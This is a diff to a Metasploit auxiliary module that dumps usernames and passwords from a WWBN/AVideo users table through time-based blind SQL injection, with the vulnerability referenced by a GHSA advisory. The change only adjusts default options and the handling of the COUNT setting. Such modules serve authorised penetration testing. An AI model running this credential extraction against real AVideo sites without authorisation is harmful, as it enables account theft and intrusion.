@@ -42,7 +42,7 @@ class MetasploitModule < Msf::Auxiliary
           ['GHSA', 'pv87-r9qf-x56p', 'WWBN/AVideo']
         ],
         'DisclosureDate' => '2026-03-05',
-        'DefaultOptions' => { 'SqliDelay' => 1, 'VERBOSE' => true },
+        'DefaultOptions' => { 'SqliDelay' => 1 },
         'Notes' => {
           'Stability' => [CRASH_SAFE],
           'SideEffects' => [IOC_IN_LOGS],
@@ -53,7 +53,7 @@ class MetasploitModule < Msf::Auxiliary
 
     register_options([
       OptString.new('TARGETURI', [true, 'The base path to AVideo', '/']),
-      OptInt.new('COUNT', [false, 'Number of users to dump (default: all)', 0])
+      OptInt.new('COUNT', [true, 'Number of users to dump (default: all)', 0])
     ])
   end
 
@@ -80,7 +80,7 @@ class MetasploitModule < Msf::Auxiliary
     setup_sqli
 
     columns = %w[user password]
-    count = datastore['COUNT'] > 0 ? datastore['COUNT'] : 0
+    count = datastore['COUNT']
     print_status('Dumping user credentials from the users table...')
     print_warning('Time-based blind extraction is slow (~4s per character). Be patient.')
     data = @setup_sqli.dump_table_fields('users', columns, '', count)
